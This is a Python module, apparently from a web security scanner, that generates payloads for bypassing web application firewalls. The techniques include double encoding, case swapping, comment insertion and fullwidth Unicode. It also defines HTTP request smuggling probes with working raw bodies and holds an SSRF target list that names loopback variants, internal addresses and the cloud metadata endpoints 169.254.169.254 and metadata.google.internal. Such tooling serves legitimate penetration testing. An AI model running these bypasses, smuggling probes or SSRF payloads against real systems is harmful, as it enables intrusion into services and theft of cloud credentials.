"""Modern WAF bypass strategies.

Implements the payload generators the upgraded HeaderInjectionEngine
uses to probe WAFs. The implementations are deliberately lightweight —
they construct byte-level payloads but do not actually open TCP
connections. The real probing still happens in the engine; this module
only contributes the payload factories and the test runner hook.
"""

from __future__ import annotations

import logging
import re
from collections.abc import Iterable
from dataclasses import dataclass, field
from typing import Any

from src.detection.waf.fingerprints import (
    BY_NAME,
    STRATEGY_DESCRIPTIONS,
)

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Double-encoding payload factory
# ---------------------------------------------------------------------------


def double_encode(value: str) -> str:
    """Return ``value`` with each byte URL-encoded twice."""

    once = "".join(f"%{ord(c):02x}" for c in value)
    return "".join(f"%{ord(c):02x}" for c in once)


def double_encode_path(value: str) -> str:
    """Return ``value`` with each character percent-encoded twice (path-safe)."""

    return double_encode(value)


def double_encode_query_param(name: str, value: str) -> dict[str, str]:
    return {double_encode(name): double_encode(value)}


# ---------------------------------------------------------------------------
# Comment injection / case-swap payload factories
# ---------------------------------------------------------------------------


_SQL_COMMENT = "/**/"
_HTML_COMMENT_OPEN = "<!--"
_HTML_COMMENT_CLOSE = "-->"


def case_swap(value: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(value))


def comment_injection_sql(value: str) -> str:
    """Insert ``/**/`` inside the SQL payload between alphabetic runs."""

    return re.sub(r"([A-Za-z]{2,})", lambda m: m.group(1) + _SQL_COMMENT, value)


def comment_injection_html(value: str) -> str:
    """Wrap HTML payload in ``<!-- -->`` blocks to confuse signature rules."""

    return f"{_HTML_COMMENT_OPEN}{value}{_HTML_COMMENT_CLOSE}"


def unicode_normalize(value: str) -> str:
    """Return fullwidth-equivalent variant for ASCII punctuation."""

    mapping = {
        "<": "\uff1c",
        ">": "\uff1e",
        "(": "\uff08",
        ")": "\uff09",
        "/": "\uff0f",
        "'": "\uff07",
        '"': "\uff02",
        "=": "\uff1d",
    }
    return "".join(mapping.get(c, c) for c in value)


# ---------------------------------------------------------------------------
# HTTP request smuggling payload factory
# ---------------------------------------------------------------------------


@dataclass(slots=True)
class SmugglingProbe:
    """A single smuggling probe definition."""

    name: str
    description: str
    method: str
    path: str
    headers: dict[str, str] = field(default_factory=dict)
    body: str = ""
    variant: str = "cl_te"  # cl_te | te_cl | te_te | h2_pseudo
    notes: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "description": self.description,
            "method": self.method,
            "path": self.path,
            "headers": dict(self.headers),
            "body": self.body,
            "variant": self.variant,
            "notes": self.notes,
        }


_CL_TE_PROBE = SmugglingProbe(
    name="cl_te_basic",
    description="CL.TE smuggling — Content-Length claims body, Transfer-Encoding is honoured by backend.",
    method="POST",
    path="/",
    headers={"Content-Length": "6", "Transfer-Encoding": "chunked"},
    body="0\r\n\r\nG",
    variant="cl_te",
    notes="Backend parses chunked; front-end uses CL. The 'G' is smuggled into the next request.",
)

_TE_CL_PROBE = SmugglingProbe(
    name="te_cl_basic",
    description="TE.CL smuggling — Transfer-Encoding is honoured by front-end, CL by backend.",
    method="POST",
    path="/",
    headers={"Transfer-Encoding": "chunked", "Content-Length": "4"},
    body="5c\r\nGPOST / HTTP/1.1\r\nHost: x\r\n\r\n0\r\n\r\n",
    variant="te_cl",
    notes="Smuggled 'GPOST / HTTP/1.1' gets interpreted as the start of the next request.",
)

_TE_OBFUSCATE = SmugglingProbe(
    name="te_obfuscate",
    description="TE.TE smuggling using Transfer-Encoding: chunked with whitespace/case obfuscation.",
    method="POST",
    path="/",
    headers={"Transfer-Encoding": "chunked", "Transfer-encoding": "cow"},
    body="0\r\n\r\n",
    variant="te_te",
    notes="Two TE headers — front-end picks one, back-end picks the other.",
)


_H2_PSEUDO_PROBE = SmugglingProbe(
    name="h2_pseudo_smuggling",
    description="HTTP/2 pseudo-header smuggling via :path fragmentation.",
    method="GET",
    path="/",
    headers={":path": "/api/private?probe=1"},
    body="",
    variant="h2_pseudo",
    notes="Requires HTTP/2 transport; works against front-ends that re-serialise to HTTP/1.1.",
)


def smuggling_probes() -> tuple[SmugglingProbe, ...]:
    return (
        _CL_TE_PROBE,
        _TE_CL_PROBE,
        _TE_OBFUSCATE,
        _H2_PSEUDO_PROBE,
    )


# ---------------------------------------------------------------------------
# HTTP/2 attacks
# ---------------------------------------------------------------------------


def h2_header_lowercase_split(name: str, value: str) -> tuple[dict[str, str], dict[str, str]]:
    """Return (lowercase, mixed-case) header sets for HPACK divergence testing."""

    return (
        {name.lower(): value},
        {name.title(): value, name.upper(): value},
    )


def h2_pseudo_path_smuggle(path_a: str, path_b: str) -> dict[str, str]:
    """Build pseudo-header pair that splits :path across frames."""

    return {":path": f"{path_a}?{path_b}"}


# ---------------------------------------------------------------------------
# Strategy selector
# ---------------------------------------------------------------------------


@dataclass(slots=True)
class StrategyBundle:
    """Grouped payloads to apply against a WAF fingerprint."""

    waf_name: str
    strategies: tuple[str, ...]
    payloads: dict[str, list[str]] = field(default_factory=dict)
    smuggling_probes: tuple[SmugglingProbe, ...] = ()
    description: str = ""

    def to_dict(self) -> dict[str, Any]:
        return {
            "waf_name": self.waf_name,
            "strategies": list(self.strategies),
            "payloads": {k: list(v) for k, v in self.payloads.items()},
            "smuggling_probes": [p.to_dict() for p in self.smuggling_probes],
            "description": self.description,
        }


_BASE_INJECTION_PAYLOADS: tuple[str, ...] = (
    "127.0.0.1",
    "localhost",
    "0.0.0.0",  # noqa: S104 - literal SSRF probe payload, not a network bind
    "0",
    "127.1",
    "127.0.1",
    "2130706433",
    "[::1]",
    "0x7f000001",
    "127.0.0.1.nip.io",
    "127.0.0.1.sslip.io",
    "spoofed.burpcollaborator.net",
    "127.0.0.1.xip.io",
    "10.0.0.1",
    "169.254.169.254",
    "metadata.google.internal",
)


def build_strategy_bundle(
    waf_name: str,
    base_payloads: Iterable[str] | None = None,
) -> StrategyBundle:
    """Return a tailored payload bundle for a given WAF."""

    fingerprint = BY_NAME.get(waf_name)
    if fingerprint is None:
        fingerprint = BY_NAME["Unknown / Generic WAF"]
    strategies = list(fingerprint.bypass_strategies)
    base = list(base_payloads or _BASE_INJECTION_PAYLOADS)

    payloads: dict[str, list[str]] = {}
    if "double_encoding" in strategies:
        payloads["double_encoded"] = [double_encode(p) for p in base]
    if "case_swap" in strategies:
        payloads["case_swapped"] = [case_swap(p) for p in base]
    if "comment_injection" in strategies:
        payloads["comment_sql"] = [comment_injection_sql(p) for p in base]
        payloads["comment_html"] = [comment_injection_html(p) for p in base]
    if "unicode_normalization" in strategies:
        payloads["unicode"] = [unicode_normalize(p) for p in base]
    if "json_padding" in strategies:
        payloads["json_padded"] = [
            json_pad(p) for p in base if "/" in p or "." in p
        ]
    if not payloads:
        payloads["default"] = base

    smuggling = smuggling_probes() if any(
        s in strategies for s in ("request_smuggling_cl_te", "request_smuggling_te_cl", "h2_pseudo_header_smuggling", "h2_stream_priority")
    ) else ()

    return StrategyBundle(
        waf_name=fingerprint.name,
        strategies=tuple(strategies),
        payloads=payloads,
        smuggling_probes=smuggling,
        description=STRATEGY_DESCRIPTIONS.get("; ".join(strategies), ""),
    )


def json_pad(value: str) -> str:
    """Wrap a value inside a nested JSON structure (Wallarm/AWS WAF friendly)."""

    return '{"a":{"b":{"c":"' + value.replace('"', '\\"') + '"}}}'


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


def describe_strategy(name: str) -> str:
    return STRATEGY_DESCRIPTIONS.get(name, "No description available.")


def payloads_for(
    waf_name: str,
    *,
    base_payloads: Iterable[str] | None = None,
) -> dict[str, Any]:
    bundle = build_strategy_bundle(waf_name, base_payloads=base_payloads)
    return bundle.to_dict()


__all__ = [
    "StrategyBundle",
    "SmugglingProbe",
    "build_strategy_bundle",
    "case_swap",
    "comment_injection_html",
    "comment_injection_sql",
    "describe_strategy",
    "double_encode",
    "double_encode_path",
    "double_encode_query_param",
    "h2_header_lowercase_split",
    "h2_pseudo_path_smuggle",
    "json_pad",
    "payloads_for",
    "smuggling_probes",
    "unicode_normalize",
]
